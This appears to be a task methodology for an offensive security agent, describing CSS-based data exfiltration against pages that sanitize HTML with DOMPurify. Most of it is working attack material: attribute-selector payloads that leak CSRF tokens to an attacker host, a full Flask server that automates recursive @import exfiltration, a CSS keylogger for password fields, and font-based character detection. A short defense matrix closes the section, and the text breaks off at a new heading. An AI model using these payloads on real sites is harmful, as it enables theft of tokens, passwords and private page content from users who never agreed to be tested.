# AGENT TASK: CSS Exfiltration Deep Methodology
# PURPOSE: Exploit CSS as data exfiltration channel when script execution is blocked
# PRIORITY: Run when style injection possible but JS blocked by CSP
# TECHNIQUES: Attribute selectors, Fontleak, CSS keylogging, font-face detection
# INPUTS: Style injection point, sensitive data on same page, CSP policy
# OUTPUT: CSS exfiltration PoC, leaked data, server implementation
# SECTIONS: F21 (CSS Exfiltration Deep Methodology)
---

## SECTION F21: CSS Exfiltration Deep Methodology — Exploiting DOMPurify's Blind Spot

### Why CSS Is DOMPurify's Blind Spot

DOMPurify's own documentation states: **"DOMPurify is not a CSS sanitizer."** This is not a limitation — it's a deliberate design choice. DOMPurify sanitizes HTML structure and JavaScript execution vectors, but intentionally does not parse, validate, or restrict CSS content within:
- `<style>` elements (unless FORBID_TAGS: ['style'])
- `style` attributes (unless FORBID_ATTR: ['style'])

This creates a significant attack surface when the application:
1. Allows users to inject CSS (via DOMPurify-sanitized HTML containing style tags/attributes)
2. Displays sensitive data on the same page as the injected CSS
3. Does not have restrictive CSP `style-src` directives

### Technique 1: CSS Attribute Selector Sequential Leak

**How It Works:**

CSS attribute selectors can match against the VALUE of HTML attributes. By crafting selectors that match one character at a time and loading a unique background URL for each match, an attacker can exfiltrate attribute values character by character.

**Target Identification:**

```
Exploitable Targets
====================
Any HTML element whose attribute contains sensitive data:
  ├─ <input type="hidden" name="csrf_token" value="a1b2c3d4...">
  ├─ <meta name="csrf-token" content="...">
  ├─ <input name="email" value="user@example.com">
  ├─ <div data-user-id="12345">
  ├─ <form data-api-key="sk_live_...">
  └─ <input name="credit_card" value="4111...">
```

**Step-by-Step Attack:**

```
Phase 1: Inject Initial CSS
==============================

Payload submitted through DOMPurify-sanitized input:

<style>
  /* Probe first character of CSRF token */
  input[name="csrf_token"][value^="0"] { background: url(https://attacker.com/leak?p=0&c=0); }
  input[name="csrf_token"][value^="1"] { background: url(https://attacker.com/leak?p=0&c=1); }
  input[name="csrf_token"][value^="2"] { background: url(https://attacker.com/leak?p=0&c=2); }
  /* ... continue for all hex characters 0-9, a-f */
  input[name="csrf_token"][value^="f"] { background: url(https://attacker.com/leak?p=0&c=f); }
</style>

Phase 2: Server Receives First Character
==========================================
Attacker's server receives: GET /leak?p=0&c=a
First character = 'a'

Phase 3: Generate Next CSS Round (via @import)
==============================================
Inject CSS with @import that loads next round:

<style>@import url(https://attacker.com/next-css?known=a);</style>

Server responds with CSS targeting second character:

  input[name="csrf_token"][value^="a0"] { background: url(https://attacker.com/leak?p=1&c=0); }
  input[name="csrf_token"][value^="a1"] { background: url(https://attacker.com/leak?p=1&c=1); }
  /* ... */

Phase 4: Repeat Until Complete Token Leaked
============================================
Each round reveals one more character.
32-char hex token = 32 rounds × 16 requests = ~512 HTTP requests
At ~50ms per request = ~26 seconds for complete token theft
```

**Attacker's Server Implementation:**

```python
# CSS exfiltration server (Python/Flask)
# For authorized security testing only

from flask import Flask, request, Response
import string

app = Flask(__name__)
leaked_data = {}

@app.route('/leak')
def leak():
    target = request.args.get('target', 'csrf')
    pos = int(request.args.get('p', 0))
    char = request.args.get('c', '')
    
    if target not in leaked_data:
        leaked_data[target] = ''
    
    if pos == len(leaked_data[target]):
        leaked_data[target] += char
        print(f"[+] {target}: {leaked_data[target]}")
    
    return Response(status=200)

@app.route('/next-css')
def next_css():
    target = request.args.get('target', 'csrf')
    known = leaked_data.get(target, '')
    attr_name = request.args.get('attr', 'csrf_token')
    element = request.args.get('el', 'input')
    
    charset = string.hexdigits[:16]  # 0-9, a-f for hex tokens
    next_pos = len(known)
    
    rules = []
    for c in charset:
        prefix = known + c
        rules.append(
            f'{element}[name="{attr_name}"][value^="{prefix}"] '
            f'{{ background: url(https://attacker.com/leak?target={target}&p={next_pos}&c={c}); }}'
        )
    
    css = '\n'.join(rules)
    # Add recursive @import for next round
    css += f'\n@import url(https://attacker.com/next-css?target={target}&attr={attr_name}&el={element});'
    
    return Response(css, content_type='text/css')

@app.route('/status')
def status():
    return leaked_data

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=443, ssl_context='adhoc')
```

### Technique 2: Fontleak — State-of-the-Art Text Content Exfiltration (2025)

**Overview:**
Fontleak extracts the TEXT CONTENT of elements (not just attribute values) using custom OpenType font ligatures and CSS container queries. Published in 2025, it achieved ~1,000 characters per minute exfiltration from chatgpt.com.

**How It Works (Technical Deep-Dive):**

```
Step 1: Create Custom OpenType Font
=====================================
The font uses GSUB (Glyph Substitution) ligature lookup tables:
  - Define a ligature: when characters "se" appear in sequence,
    replace with a single glyph that has a WIDE width (e.g., 1000px)
  - For "sa", use a glyph with width 1001px
  - For "sb", use a glyph with width 1002px
  - Each unique 2-char sequence maps to a unique width

Step 2: Apply Font and Container Queries
==========================================
<style>
  @font-face {
    font-family: 'leak-se';
    src: url(data:font/woff2;base64,...);  /* Font with "se" ligature */
  }
  
  .target-container {
    container-type: inline-size;
    font-family: 'leak-se', monospace;
  }
  
  /* When container width matches the wide ligature glyph: */
  @container (min-width: 999px) and (max-width: 1001px) {
    .indicator {
      background: url(https://attacker.com/detected?bigram=se);
    }
  }
</style>

<div class="target-container">
  <div class="indicator"></div>
  <!-- Target text content here, rendered with ligature font -->
</div>

Step 3: Iterate Through Possible Bigrams
==========================================
Generate fonts for each possible 2-character combination.
Apply each font, check if container width changes.
Server receives which bigrams exist in the text.

Step 4: Reconstruct Text from Bigrams
========================================
With all bigrams known, reconstruct the original text:
  Bigrams: "se", "ec", "cr", "re", "et"
  Text: "secret"
```

**Performance Characteristics:**
- ~1,000 characters extracted per minute
- Works across origins (CSS loaded cross-origin via @import)
- No JavaScript required — pure CSS attack
- Bypasses CSP script-src restrictions entirely
- Requires the target text to be rendered on the page

### Technique 3: CSS Keylogging in React Applications

**Why React Is Uniquely Vulnerable:**

React (unlike vanilla HTML) updates the `value` ATTRIBUTE of input elements on every keystroke. In vanilla HTML, the `value` attribute remains the initial value while the `value` property changes — CSS can only select on attributes, not properties. React's reconciliation algorithm synchronizes both.

```
Vanilla HTML:                          React:
<input value="initial">               <input value="h">      (after typing 'h')
  ├─ .value property: "hello"          ├─ .value property: "hello"
  ├─ getAttribute('value'): "initial"  ├─ getAttribute('value'): "h"
  └─ CSS [value$="o"]: NO MATCH       └─ CSS [value$="h"]: MATCH!
                                        Then after 'e':
                                        <input value="he">
                                        └─ CSS [value$="e"]: MATCH!
```

**CSS Keylogger Payload:**

```html
<style>
  /* Detect last character typed */
  input[type="password"][value$="a"] { background: url(https://attacker.com/key?k=a); }
  input[type="password"][value$="b"] { background: url(https://attacker.com/key?k=b); }
  input[type="password"][value$="c"] { background: url(https://attacker.com/key?k=c); }
  /* ... continue for all printable ASCII characters */
  input[type="password"][value$="z"] { background: url(https://attacker.com/key?k=z); }
  input[type="password"][value$="0"] { background: url(https://attacker.com/key?k=0); }
  /* ... numbers, special chars */
  input[type="password"][value$="!"] { background: url(https://attacker.com/key?k=!); }
  input[type="password"][value$="@"] { background: url(https://attacker.com/key?k=@); }
</style>
```

**Limitations and Mitigations:**
- Only captures the LAST character per keystroke (suffix selector)
- Browser caches background URLs — only first occurrence of each character triggers request
- Mitigation: Set `autocomplete="off"`, use virtual keyboard, don't sync value attribute

### Technique 4: @font-face unicode-range Character Detection

```html
<style>
  /* Detect which characters exist in target element */
  @font-face {
    font-family: 'detect';
    src: url(https://attacker.com/char?c=A);
    unicode-range: U+0041; /* 'A' */
  }
  @font-face {
    font-family: 'detect';
    src: url(https://attacker.com/char?c=B);
    unicode-range: U+0042; /* 'B' */
  }
  /* ... for each character of interest */
  
  .sensitive-content {
    font-family: 'detect', serif;
  }
</style>
```

The browser only downloads the font file for characters that actually appear in the rendered text. The attacker's server sees which character-specific fonts were requested, revealing which characters exist in the target content.

**Limitation:** Reveals character SET, not character ORDER. Must combine with other techniques (ligatures, attribute selectors) for full exfiltration.

### Detection and Prevention

```
CSS Exfiltration Defense Matrix
================================

Defense                              | Blocks Attr Selectors | Blocks Fontleak | Blocks Keylogging | Blocks @font-face
-------------------------------------|----------------------|-----------------|-------------------|------------------
FORBID_TAGS: ['style']               | YES                  | YES             | YES               | YES
FORBID_ATTR: ['style']               | Partial (inline only)| Partial         | Partial           | Partial
CSP style-src 'self'                 | YES (@import blocked)| Partial         | NO (inline)       | YES (ext fonts)
CSP font-src 'self'                  | NO                   | YES             | NO                | YES
Separate CSS sanitizer (css-tree)    | YES                  | YES             | YES               | YES
Render secrets in iframes            | YES                  | YES             | YES               | YES
Don't render secrets as attributes   | YES                  | NO              | NO                | NO

RECOMMENDED: FORBID_TAGS: ['style'] + FORBID_ATTR: ['style'] eliminates the entire CSS attack surface.
```

---

## SECTION F22: Server-Side DOMPurify Exploitation — Parser Differentials to RCE
